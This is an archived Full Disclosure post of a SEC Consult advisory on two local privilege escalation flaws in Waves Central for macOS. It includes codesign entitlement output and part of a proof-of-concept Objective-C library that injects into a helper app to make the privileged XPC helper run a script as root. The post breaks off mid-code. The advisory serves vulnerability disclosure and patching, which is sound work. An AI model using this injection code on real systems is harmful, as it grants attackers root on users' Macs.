---
title: SEC Consult SA-20260609-0 :: Multiple Local Privilege Escalation Vulnerabilities in Waves Audio - Waves Central
url: https://seclists.org/fulldisclosure/2026/Jun/6
source: Full Disclosure
date: 2026-06-16
fetch_date: 2026-06-17T07:04:08.509177
---

# SEC Consult SA-20260609-0 :: Multiple Local Privilege Escalation Vulnerabilities in Waves Audio - Waves Central

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](5)
[By Date](date.html#6)
[![Next](/images/right-icon-16x16.png)](7)

[![Previous](/images/left-icon-16x16.png)](5)
[By Thread](index.html#6)
[![Next](/images/right-icon-16x16.png)](7)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20260609-0 :: Multiple Local Privilege Escalation Vulnerabilities in Waves Audio - Waves Central

---

*From*: SEC Consult Vulnerability Lab via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Tue, 9 Jun 2026 06:50:33 +0000

---

```
SEC Consult Vulnerability Lab Security Advisory < 20260609-0 >
=======================================================================
              title: Multiple Local Privilege Escalation Vulnerabilities
            product: Waves Audio - Waves Central
 vulnerable version: v13.0.8 - v16.6.0
      fixed version: v16.6.2
         CVE number: CVE-2026-24064, CVE-2026-24065
             impact: high
           homepage:https://www.waves.com
              found: 2026-01-07
                 by: Florian Haselsteiner (Office Vienna)
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult, an Atos business
                     Europe | Asia

                     https://www.sec-consult.com

=======================================================================

Vendor description:
-------------------
"Waves is the world’s leading developer of audio plugins and signal processors
for the professional and consumer electronics audio markets. Heard on hit
records, major motion pictures, and popular video games worldwide, Waves’
cutting-edge software and hardware processors are used in every aspect of
audio production, from tracking to mixing to mastering, broadcast, live sound,
and more. Waves offers Native and SoundGrid audio plugins in VST, TDM, RTAS,
and AU formats for Pro Tools, Logic, Cubase, Ableton and other popular hosts."

Source:https://www.waves.com/about-us

Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.

SEC Consult highly recommends to perform a thorough security review of the product
conducted by security professionals to identify and resolve potential further
security issues.

Vulnerability overview/description:
-----------------------------------
1) Local Privilege Escalation via DYLIB Injection (CVE-2026-24064)
Waves Central provides a "PrivilegedHelperTool" during installation.
It uses the "InstlHelperApplication" located at the following path
to connect to the privileged helper tool via XPC:
/Applications/Waves\ Central.app/Contents/Resources/res/external/bin/InstlHelperApplication.app/Contents/MacOS/

It was found that the "InstlHelperApplication" was signed with the
entitlements "com.apple.security.cs.allow-dyld-environment-variables" and
"com.apple.security.cs.disable-library-validation" which together allow to inject
unsigned libraries into the process and therefore inheriting the code signature.

----------------------------------------------------------------------
% codesign -dvv --entitlements -  /Applications/Waves\
Central.app/Contents/Resources/res/external/bin/InstlHelperApplication.app/Contents/MacOS/InstlHelperApplication
Executable=/Applications/Waves
Central.app/Contents/Resources/res/external/bin/InstlHelperApplication.app/Contents/MacOS/InstlHelperApplication
Identifier=com.waves.central.InstlHelperApplication
Format=app bundle with Mach-O universal (x86_64 arm64)
CodeDirectory v=20500 size=1684 flags=0x10000(runtime) hashes=41+7 location=embedded
Signature size=8956
Authority=Developer ID Application: Waves Inc (GT6E3XD798)
Authority=Developer ID Certification Authority
Authority=Apple Root CA
Timestamp=12.02.2023 at 19:37:53
Info.plist entries=32
TeamIdentifier=GT6E3XD798
Runtime Version=11.1.0
Sealed Resources version=2 rules=13 files=5
Internal requirements count=1 size=200
[Dict]
        [Key] com.apple.security.inherit
        [Value]
                [Bool] true
        [Key] com.apple.security.network.client
        [Value]
                [Bool] true
        [Key] com.apple.security.network.server
        [Value]
                [Bool] true
        [Key] com.apple.security.files.bookmarks.app-scope
        [Value]
                [Bool] true
        [Key] com.apple.security.cs.disable-library-validation
        [Value]
                [Bool] true
        [Key] com.apple.security.files.bookmarks.document-scope
        [Value]
                [Bool] true
        [Key] com.apple.security.files.user-selected.read-write
        [Value]
                [Bool] true
        [Key] com.apple.security.personal-information.addressbook
        [Value]
                [Bool] true
        [Key] com.apple.security.cs.allow-dyld-environment-variables
        [Value]
                [Bool] true
        [Key] com.apple.security.cs.allow-unsigned-executable-memory
        [Value]
                [Bool] true
        [Key] com.apple.security.cs.disable-executable-page-protection
        [Value]
                [Bool] true
----------------------------------------------------------------------
By inheriting the code signature an attacker, who injects a malicious
library into the application, is able to abuse the signature of the
InstlHelperApplication to connect to the privileged helper tool via
its exposed mach service "com.waves.central.InstlHelper".

2) Local Privilege Escalation via Insecure XPC Client Validation (CVE-2026-24065)
It was found that the XPC service "com.waves.central.InstlHelper", offered
by the privileged helper, uses the connecting client's PID to check its
code signature. This is insecure and can be attacked using a PID reuse
attack, which will trick the service into thinking the connecting client
has a valid code signature.

Proof of concept:
-----------------
1) Local Privilege Escalation via DYLIB Injection (CVE-2026-24064)
The attacker can abuse the function "executeIrlFileWithPath" offered by
the privileged helper to get code execution as root.
To demonstrate this the following dynamic library has been developed.
After loading the library, "executeIrlFileWithPath" is triggered
to execute /tmp/lol which is basically a shell script:

----------------------------------------------------------------------
#import <Foundation/Foundation.h>
//gcc -dynamiclib name
#include <stdio.h>
@protocol HelperProtocol

- (void)getVersionWithCompletion:(void (^)(id version))completion;
- (void)executeIrlFileWithPath:(NSString *)filePath
                       homeDir:(NSString *)homeDir
                        asUser:(id)asUser
                    completion:(void (^)(id result))completion;

//executeIrlFile(withPath: Swift.String, homeDir: Swift.String, asUser: Swift.String, authData: __C.NSData?, completion:
(__C.NSNumber) -> ()) -> ()

@end

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{

    NSXPCConnection *conn =
        [[NSXPCConnection alloc]
            initWithMachServiceName:@"com.waves.central.InstlHelper"
            options:NSXPCConnectionPrivileged];

    conn.remoteObjectInterface =
        [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];

    [conn resume];

    id<HelperProtocol> proxy =
        [conn remoteObjectProxyWithErrorHandler:^(NSError *error) {
            NSLog(@"XPC error: %@", error);
        }];

    [proxy getVersionWithCompletion:^(id version) {
        NSLog(@"Version: %@", version);
    }];
    [proxy executeIrlFileW...